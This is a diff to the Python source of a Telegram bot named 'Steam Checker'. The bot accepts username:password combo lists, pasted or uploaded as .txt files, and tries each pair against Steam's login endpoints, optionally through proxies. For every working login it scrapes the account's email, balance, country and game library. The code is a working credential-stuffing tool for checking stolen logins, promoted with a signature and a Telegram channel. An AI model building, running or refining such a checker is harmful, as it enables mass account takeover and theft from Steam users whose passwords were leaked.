@@ -2,7 +2,8 @@
 # -*- coding: utf-8 -*-
 
 """
-STEAM CHECKER TELEGRAM BOT - Fixed Text Input (Clean Version)
+STEAM CHECKER TELEGRAM BOT - Full Clean Version
+Supports pasting combos directly + uploading .txt files
 """
 
 import os
@@ -31,7 +32,7 @@ TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
 OWNER_ID = int(os.getenv("OWNER_ID", "0").strip())
 
 if not TELEGRAM_TOKEN or OWNER_ID == 0:
-    raise ValueError("Set TELEGRAM_TOKEN and numeric OWNER_ID in Railway Variables!")
+    raise ValueError("Please set TELEGRAM_TOKEN and numeric OWNER_ID in Railway Variables!")
 
 MY_SIGNATURE = "@pyabrodie"
 TELEGRAM_CHANNEL = "https://t.me/HoTmIlToOLs"
@@ -60,7 +61,7 @@ def shorten_games(games, limit=12):
         return " | ".join(games[:limit]) + f" ... (+{len(games)-limit})"
     return " | ".join(games)
 
-# ====================== CHECKER ======================
+# ====================== CHECKER (from your original) ======================
 def check_steam_account(combo, proxy_url=None):
     try:
         username, password = combo.strip().split(':', 1)
@@ -83,6 +84,7 @@ def check_steam_account(combo, proxy_url=None):
     session.headers.update(headers)
 
     try:
+        # Get RSA key
         now = str(int(time.time()))
         r1 = session.post("https://steamcommunity.com/login/getrsakey/", 
                          data=f"donotcache={now}&username={user_clean}", timeout=12)
@@ -90,6 +92,7 @@ def check_steam_account(combo, proxy_url=None):
         if not j1.get("success"):
             return None
 
+        # Encrypt password
         n = int(j1["publickey_mod"], 16)
         e = int(j1["publickey_exp"], 16)
         rsa_key = RSA.construct((n, e))
@@ -97,6 +100,7 @@ def check_steam_account(combo, proxy_url=None):
         encrypted = cipher.encrypt(password.encode("utf-8"))
         pass3 = quote_plus(base64.b64encode(encrypted).decode())
 
+        # Login
         now2 = str(int(time.time()))
         payload = f"donotcache={now2}&password={pass3}&username={user_clean}&twofactorcode=&rsatimestamp={j1['timestamp']}&remember_login=false"
 
@@ -105,10 +109,12 @@ def check_steam_account(combo, proxy_url=None):
         if not j2.get("success"):
             return None
 
+        # Set cookies
         for cookie in r2.cookies:
             for d in [".steamcommunity.com", ".steampowered.com"]:
                 session.cookies.set(cookie.name, cookie.value, domain=d)
 
+        # Fetch details
         time.sleep(0.6)
         r_acc = session.get("https://store.steampowered.com/account/", timeout=15)
         email, balance, country = parse_account_page(r_acc.text)
@@ -138,6 +144,7 @@ def check_steam_account(combo, proxy_url=None):
     except:
         return None
 
+# Parsers
 def parse_account_page(html):
     email = balance = country = "Unknown"
     try:
@@ -333,7 +340,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_text))
     app.add_handler(MessageHandler(filters.Document.TEXT, handle_document))
 
-    print("🚀 Steam Checker Bot Started - Text Input Fixed")
+    print("🚀 Steam Checker Bot Started - Text + File Support")
     app.run_polling()
 
 if __name__ == "__main__":
